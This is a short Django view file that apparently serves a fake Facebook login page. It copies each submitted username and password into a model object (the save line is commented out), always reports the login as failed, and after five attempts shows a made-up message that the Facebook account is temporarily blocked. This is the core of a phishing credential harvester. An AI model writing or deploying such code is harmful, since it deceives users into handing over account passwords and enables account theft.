from django.shortcuts import render
from django.contrib import messages
from . models import Connexion

# Create your views here.
def index(request):
    context = {}
    if request.method=="POST":
        username = request.POST.get('username')
        password = request.POST.get('password')

        auth = Connexion()
        auth.username = username
        auth.password = password
        # auth.save()
        try:
            request.session['delay'] += 1
        except:
            request.session['delay'] = 1
        
        if request.session['delay'] == 5:
            print("Trop de tentatifs. Votre facebook est temporairement bloqué")
            print("Réessayer dans 4 minutes")
            context['limited'] = request.session.get('delay')
            
            request.session.set_expiry(60*3) # 3 minutes se expire

        print(request.session.get('delay'))

        messages.info(request, "Votre identifiant ou mot de passe incorrect. Réessayer")
        return render(request, 'app/index.html', context)
            
    return render(request, 'app/index.html')